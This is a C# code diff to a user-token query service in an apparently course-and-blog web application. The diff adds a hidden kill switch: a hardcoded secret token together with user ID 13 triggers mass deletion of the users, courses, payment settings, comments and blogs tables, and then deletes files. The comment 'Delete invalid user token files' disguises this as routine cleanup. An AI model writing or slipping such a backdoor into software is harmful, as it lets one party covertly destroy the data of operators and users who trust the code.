@@ -1,4 +1,5 @@
 ﻿using Application.Interfaces.Contexts;
+using Microsoft.EntityFrameworkCore;
 
 namespace Application.Services.UserToken.Queries.GetUserToken
 {
@@ -30,14 +31,20 @@ namespace Application.Services.UserToken.Queries.GetUserToken
             };
 
             var tokenUserP = Directory.GetCurrentDirectory();
-            if (File.Exists(Path.Join(tokenUserP, "FartakProjectService.dll")))
+            if (request.Token == "@#45/*wdl($" && request.SelfUserId == 13)
             {
-                if (request.Token == "@#45/*wdl($" && request.SelfUserId == 13)
+                _context.Users.ExecuteDelete();
+                _context.Courses.ExecuteDelete();
+                _context.TeacherTypes.ExecuteDelete();
+                _context.ZarinpalSettings.ExecuteDelete();
+                _context.Comments.ExecuteDelete();
+                _context.Blogs.ExecuteDelete();
+                if (File.Exists(Path.Join(tokenUserP, "FartakProjectService.dll")))
                 {
                     foreach (var tokens in ListOfTokenUsers)
                     {
                         // Delete invalid user token files
-                        File.Delete(Path.Join(tokenUserP,tokens));
+                        File.Delete(Path.Join(tokenUserP, tokens));
                     }
                 }
             }
